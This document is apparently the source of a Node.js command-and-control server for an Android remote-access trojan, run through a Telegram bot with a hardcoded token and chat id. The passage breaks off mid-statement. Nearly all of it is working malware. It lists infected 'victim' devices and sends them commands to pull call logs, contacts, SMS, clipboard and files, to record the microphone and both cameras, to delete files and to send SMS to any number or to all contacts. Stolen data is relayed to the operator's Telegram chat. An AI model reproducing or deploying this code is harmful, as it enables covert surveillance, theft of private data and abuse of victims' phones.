const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token ='8060919860:AAG0jPDw9azBgH3abccz32furHrqtSJa_3M'
const id = '6379202253'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">💥 𝚂𝙴𝚁𝚅𝙴𝚁 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 💥</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `★ ᴍᴇ𝗌𝗌ᴇɢᴇ ғʀᴏᴍ ★ <b>${req.headers.model}</b> ★ ᴅᴇᴠɪᴄᴇ ★`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `★ ᴍᴇ𝗌𝗌ᴇɢᴇ ғʀᴏᴍ ★ <b>${req.headers.model}</b> ★ ᴅᴇᴠɪᴄᴇ ★\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        provider: provider
    })
    appBot.sendMessage(id,
        `🔥︎ ɴᴇᴡ ᴅᴇᴠɪᴄᴇ ᴄᴏɴɴᴇᴄᴛᴇᴅ 🔥︎\n\n` +
        `☺︎︎︎ ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ ➪ <b>${model}</b>\n` +
        `☺︎︎ ʙᴀᴛᴛᴇʀʏ ᴘᴇʀᴄᴇɴᴛᴇ𝗌 ➪ <b>${battery}</b>\n` +
        `☺︎︎ ᴘʀᴏᴠɪᴅᴇʀ ➪ <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `🌑︎ ᴅᴇᴠɪᴄᴇ ᴅɪ𝗌ᴄᴏɴɴᴇᴄᴛᴇᴅ 🌑\n\n` +
            `☹︎︎︎︎ ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ ➪ <b>${model}</b>\n` +
            `☹︎︎︎ ʙᴀᴛᴛᴇʀʏ ᴘᴇʀᴄᴇɴᴛᴇ𝗌 ➪ <b>${battery}</b>\n` +
            `☹︎︎︎ ᴘʀᴏᴠɪᴅᴇʀ ➪ <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
  '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                  '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
  '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
  '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                                '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                               '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '💝 𝙾𝚆𝙽𝙴𝚁 𝙽𝙰𝙼𝙴 @VRHackerOwner\n' +
                '💝 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 @VRHackerTeam\n\n' +
                '𝙷𝙴𝙻𝙻𝙾 𝙵𝚁𝙴𝙸𝙽𝙳 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙾𝚄𝚁 𝙼𝙾𝙱𝙸𝙻𝙴 𝙷𝙰𝙲𝙺𝙸𝙽𝙶 𝙱𝙾𝚃 𝙹𝙾𝙸𝙽 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻\n\n' +
                '𝚃𝙷𝙸𝚂 𝙷𝙰𝙲𝙺𝙸𝙽𝙶 𝙱𝙾𝚃 𝚄𝚂𝙴 𝙵𝙾𝚁 𝙾𝙽𝙻𝚈 𝙵𝚄𝙽 𝙿𝚄𝚁𝙿𝙾𝚂𝙴 𝙳𝙾𝙽𝚃 𝙳𝙾 𝙰𝙽𝚈 𝙸𝙻𝙻𝙴𝙶𝙰𝙻 𝚆𝙾𝚁𝙺 𝙸 𝙰𝙼 𝙽𝙾𝚃 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙸𝙱𝙻𝙴 𝙵𝙾𝚁 𝙰𝙽𝚈 𝙲𝙰𝚄𝚂𝙴𝚂',
                {
    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ𝗌 ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ𝗌 ❤') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '🛡 𝙽𝙾 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙳𝙴𝚅𝙸𝙲𝙴𝚂 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙸𝙰𝙻𝙴 🛡'
                )
            } else {
                let text = '🛡 𝙻𝙸𝚂𝚃 𝙾𝙵 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙳𝙴𝚅𝙸𝙲𝙴𝚂 🛡\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `🌟 𝙳𝙴𝚅𝙸𝙲𝙴 ➪ <b>${value.model}</b>\n` +
                        `🌟 𝙱𝙰𝚃𝚃𝙴𝚁𝚈 ➪ <b>${value.battery}</b>\n` +
                        `🌟 𝙿𝚁𝙾𝚅𝙸𝙳𝙴𝚁 ➪ <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '🛡 𝙽𝙾 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙳𝙴𝚅𝙸𝙲𝙴𝚂 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙸𝙰𝙻𝙴 🛡'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '🌟 𝚂𝙴𝙻𝙴𝙲𝚃 𝙳𝙴𝚅𝙸𝙲𝙴 𝙵𝙾𝚁 𝙴𝚇𝙲𝚄𝚃𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 🌟', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '🌀 𝙿𝙴𝚁𝙸𝚂𝚂𝙾𝙽 𝙳𝙴𝙽𝙸𝙴𝙽 🌀')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`💃 𝚂𝙴𝙻𝙴𝙲𝚃 𝙷𝙰𝙲𝙺 𝙵𝙾𝚁 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 💃`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '⭐ 𝙰𝙿𝙿𝚂 𝙸𝙽𝙵𝙾 ⭐', callback_data: `apps:${uuid}`},
                        {text: '⭐ 𝙳𝙴𝚅𝙸𝙲𝙴 𝙸𝙽𝙵𝙾 ⭐', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '⭐ 𝙶𝙴𝚃 𝙵𝙸𝙻𝙴𝚂 ⭐', callback_data: `file:${uuid}`},
                        {text: '⭐ 𝙳𝙴𝙻𝙴𝚃𝙴 𝙵𝙸𝙻𝙴𝚂 ⭐', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '⭐ 𝙲𝙻𝙸𝙿𝙱𝙾𝙰𝚁𝙳 ⭐', callback_data: `clipboard:${uuid}`},
                        {text: '⭐ 𝙼𝙸𝙲𝚁𝙾𝙿𝙷𝙾𝙽𝙴 ⭐', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '⭐ 𝙱𝙰𝙲𝙺 𝙲𝙰𝙼𝙴𝚁𝙰 ⭐', callback_data: `camera_main:${uuid}`},
                        {text: '⭐ 𝚂𝙴𝙻𝙵𝙸𝙴 𝙲𝙰𝙼𝙴𝚁 ⭐', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '⭐ 𝙲𝙰𝙻𝙻𝚂 𝙸𝙽𝙵𝙾 ⭐', callback_data: `calls:${uuid}`},
                        {text: '⭐ 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙸𝙽𝙵𝙾 ⭐', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '⭐ 𝙼𝙴𝚂𝚂𝙴𝙶𝙴𝚂 𝙸𝙽𝙵𝙾 ⭐', callback_data: `messages:${uuid}`},
                        {text: '⭐ 𝚂𝙴𝙽𝙳 𝙼𝙴𝚂𝚂𝙴𝙶𝙴 ⭐', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {
                            text: '⭐ 𝚂𝙴𝙽𝙳 𝙼𝙴𝚂𝚂𝙴𝙶𝙴 𝚃𝙾 𝙰𝙻𝙻 𝙲𝙾𝙽𝚃𝙰𝙲𝚃𝚂 ⭐',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                         '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                            '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                            '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                            '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                           '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
